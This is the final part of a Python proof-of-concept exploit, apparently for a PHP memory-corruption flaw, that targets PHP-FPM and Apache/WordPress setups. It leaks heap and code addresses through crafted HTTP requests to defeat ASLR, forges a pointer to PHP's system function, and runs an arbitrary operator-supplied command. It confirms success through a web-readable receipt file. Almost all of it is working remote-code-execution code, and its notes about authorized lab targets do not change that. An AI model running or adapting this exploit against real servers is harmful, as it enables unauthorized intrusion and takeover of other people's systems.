    fpm_require_status(follow, {200}, "FPM code disclosure follow-up")
    receipt = fpm_parse_receipt(
        client.get(f"/fpm-session-receipt.php?sid={consumer_sid}")
    )
    encoded = receipt.get("code_bytes_le", "")
    if len(encoded) != 16:
        raise PocError("FPM code-pointer receipt was unavailable or not eight bytes")
    try:
        code_pointer = int.from_bytes(bytes.fromhex(encoded), "little")
    except ValueError as exc:
        raise PocError("FPM code-pointer receipt was not valid hex") from exc
    code_base = code_pointer - FPM_PROFILE["zval_ptr_dtor"]
    if code_base <= 0 or code_base & 0xFFF:
        raise PocError(f"derived FPM code base is implausible: 0x{code_base:x}")
    return code_pointer, code_base


def fpm_execute(
    client: FpmClient,
    heap_base: int,
    code_base: int,
    command: bytes,
) -> FpmResponse:
    consumer_sid = fpm_sid("rc")
    producer_sid = fpm_sid("rp")
    fpm_require_status(
        client.get(f"/fpm-object-progress-key-seed.php?sid={consumer_sid}"),
        {200},
        "FPM object consumer seed",
    )
    fpm_require_status(
        fpm_standard_arm(client, producer_sid),
        {200},
        "FPM execution standard arm",
    )
    fpm_require_status(
        fpm_application_oom(client, producer_sid),
        {200},
        "FPM execution producer OOM",
    )
    carrier = heap_base + FPM_PROFILE["object_carrier_offset"]
    return fpm_pointer_forge(
        client,
        consumer_sid,
        carrier,
        0x308,
        command=command,
        code_base=code_base,
    )


def run_fpm_profile(
    args: argparse.Namespace,
    scheme: str,
    host: str,
    port: int,
    supplied_path: str,
) -> int:
    client = FpmClient(host, port, fpm_root_path(supplied_path), args.timeout)
    available, reason = fpm_fixture_available(client)
    if not available:
        raise PocError(f"FPM exact-profile signature was not substantiated: {reason}")
    print(
        f"[*] profile={FPM_PROFILE['name']} endpoint={scheme}://{host}:{port}"
        f"{client.base_path or '/'} selection={reason}",
        flush=True,
    )
    print(
        "[*] scope=exact-pinned-fpm-fixture; dynamic ASLR recovery; "
        "not a stock WordPress or universal PHP probe",
        flush=True,
    )

    command = args.command.encode()
    receipt_path: str | None = None
    if args.verify:
        token = "v" + secrets.token_hex(5)
        receipt_path = f"/receipts/{token}.txt"
        filesystem_path = f"/var/www/html/receipts/{token}.txt"
        command = b"(" + command + b")>" + filesystem_path.encode() + b" 2>&1"
        if len(command) > 71:
            raise PocError(
                f"verified FPM command expands to {len(command)} bytes; "
                "exact carrier limit is 71"
            )
        before = client.get(receipt_path)
        print(
            f"[*] fpm pre-receipt path={receipt_path} status={before.status}",
            flush=True,
        )
        if before.status != 404:
            raise PocError("FPM receipt already exists; refusing stale evidence")
    elif len(command) > 71:
        raise PocError(
            f"FPM command is {len(command)} bytes; exact carrier limit is 71"
        )

    heap_leak, heap_base = fpm_leak_heap(client, args.attempts)
    print(
        f"[+] fpm heap_leak=0x{heap_leak:x} heap_base=0x{heap_base:x}",
        flush=True,
    )
    code_pointer, code_base = fpm_leak_code(client, heap_base)
    print(
        f"[+] fpm zval_ptr_dtor=0x{code_pointer:x} "
        f"code_base=0x{code_base:x}",
        flush=True,
    )
    print(
        f"[+] fpm carrier=0x{heap_base + FPM_PROFILE['object_carrier_offset']:x} "
        f"zif_system=0x{code_base + FPM_PROFILE['zif_system']:x}",
        flush=True,
    )
    final = fpm_execute(client, heap_base, code_base, command)
    print(
        f"[*] fpm final_transport=HTTP_{final.status or 'none'} "
        f"bytes={final.raw_size}",
        flush=True,
    )

    if receipt_path is None:
        raise PocError(
            "FPM final stage was sent, but RCE is unverified without -verify"
        )
    for _ in range(max(20, args.follow_attempts)):
        receipt = client.get(receipt_path)
        if receipt.status == 200:
            output = receipt.body.decode("utf-8", "replace").strip()
            print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
            print(f"[+] COMMAND_OUTPUT: {output}")
            return 0
        time.sleep(0.1)
    raise PocError("no independent FPM HTTP command receipt")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-c", "--command", default="id")
    parser.add_argument("-verify", "--verify", action="store_true")
    parser.add_argument(
        "--profile", choices=("auto", *PROFILES), default="auto",
        help="exact validated target profile; auto substantiates FPM fixture signatures first",
    )
    parser.add_argument(
        "-k", "--insecure", action="store_true",
        help="disable TLS certificate verification for an authorized lab target",
    )
    parser.add_argument("--attempts", type=int, default=12)
    parser.add_argument("--follow-attempts", type=int, default=12)
    parser.add_argument("--timeout", type=float, default=180)
    parser.add_argument(
        "--base-cache",
        type=Path,
        default=default_base_cache_path(),
        help="local Apache base cache used within one master-process lifetime",
    )
    parser.add_argument(
        "--no-base-cache",
        action="store_true",
        help="ignore and do not update the local Apache base cache",
    )
    args = parser.parse_args()
    if args.attempts < 1 or args.follow_attempts < 1:
        parser.error("attempt counts must be positive")

    global TRANSPORT_SCHEME, TLS_INSECURE
    scheme, host, port, supplied_path = parse_url(args.url)
    TRANSPORT_SCHEME = scheme
    TLS_INSECURE = args.insecure

    if args.profile == FPM_PROFILE["name"]:
        return run_fpm_profile(args, scheme, host, port, supplied_path)
    if args.profile == "auto":
        probe_client = FpmClient(
            host, port, fpm_root_path(supplied_path), args.timeout
        )
        fpm_available, _ = fpm_fixture_available(probe_client)
        if fpm_available:
            return run_fpm_profile(args, scheme, host, port, supplied_path)

    selected_profile = PROFILE if args.profile == "auto" else PROFILES[args.profile]
    if selected_profile is not PROFILE:
        raise PocError("selected profile is not implemented by this artifact")
    endpoint, selection = select_endpoint(host, port, supplied_path, args.timeout)
    print(
        f"[*] profile={PROFILE['name']} endpoint={scheme}://{host}:{port}{endpoint} "
        f"selection={selection}",
        flush=True,
    )
    print(
        "[*] scope=exact-pinned-build; operator must have authorization; "
        "not a universal PHP probe",
        flush=True,
    )

    receipt_path = None
    receipt_marker = None
    if args.verify:
        command, receipt_path = verification_plan(endpoint)
        receipt_marker = b"uid=33(www-data)"
        receipt_kind = "verification"
    else:
        command = args.command
        capture = command_receipt_plan(endpoint, command)
        if capture is not None:
            command, receipt_path = capture
            receipt_kind = "command-output"

    if receipt_path is not None:
        status, _ = get(host, port, receipt_path, args.timeout)
        print(
            f"[*] pre-receipt kind={receipt_kind} path={receipt_path} "
            f"status={status_code(status)}",
            flush=True,
        )
        if status_code(status) != 404:
            raise PocError("receipt already exists; refusing stale evidence")
    elif not args.verify:
        print(
            "[!] command is too long for the independent WordPress receipt; "
            "falling back to buffered inline output",
            flush=True,
        )
    if len(command.encode()) > 32:
        raise PocError("command exceeds the calibrated 32-byte carrier")

    cache_key = base_cache_key(
        scheme, host, port, endpoint, str(PROFILE["name"])
    )
    if not args.no_base_cache and receipt_path is not None:
        cached = load_cached_bases(args.base_cache, cache_key)
        if cached is not None:
            heap, libphp = cached
            print(
                f"[*] base-cache hit path={args.base_cache}; "
                "validating with an independent receipt",
                flush=True,
            )
            if run_apache_stage3(
                host,
                port,
                endpoint,
                args.timeout,
                args.follow_attempts,
                command,
                heap,
                libphp,
                receipt_path,
                receipt_marker,
                source="cache",
            ):
                return 0
            print(
                "[!] cached bases did not produce a receipt; "
                "discarding them and retrying the disclosure chain",
                flush=True,
            )
            discard_cached_bases(args.base_cache, cache_key)

    arm_response = stage1_arm(host, port, endpoint, args.timeout)
    arm_status, _, _ = split_response(arm_response)
    print(f"[*] stage1 arm status={arm_status.decode('latin1', 'replace')!r}", flush=True)
    if status_code(arm_status) != 500:
        raise PocError("stage1 did not produce the expected closed-profile OOM response")

    heap = libphp = 0
    for attempt in range(1, args.attempts + 1):
        response = stage2_follow(host, port, endpoint, args.timeout)
        status, _, _ = split_response(response)
        leak = decoded_session_cookie(response)
        print(
            f"[*] stage2 attempt={attempt} status={status_code(status)} cookie={len(leak)}",
            flush=True,
        )
        if len(leak) != PROFILE["leak_read"]:
            continue
        heap, heap_count, libphp, dtor_count = derive_bases(leak)
        print(
            f"[+] heap={heap:#x} support={heap_count} "
            f"libphp={libphp:#x} dtor_repeats={dtor_count}",
            flush=True,
        )
        break
    if not heap or not libphp:
        raise PocError("stage2 did not reach the armed worker within the attempt bound")

    if not args.no_base_cache:
        save_cached_bases(args.base_cache, cache_key, heap, libphp)
        print(f"[*] base-cache updated path={args.base_cache}", flush=True)

    if run_apache_stage3(
        host,
        port,
        endpoint,
        args.timeout,
        args.follow_attempts,
        command,
        heap,
        libphp,
        receipt_path,
        receipt_marker,
        source="fresh-disclosure",
    ):
        return 0
    if receipt_path is not None:
        raise PocError("no independent HTTP command receipt within the attempt bound")
    raise PocError(
        "no inline command receipt; this buffered profile requires -verify or an external receipt"
    )


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (PocError, OSError) as error:
        print(f"[-] {error}", file=sys.stderr)
        raise SystemExit(1)
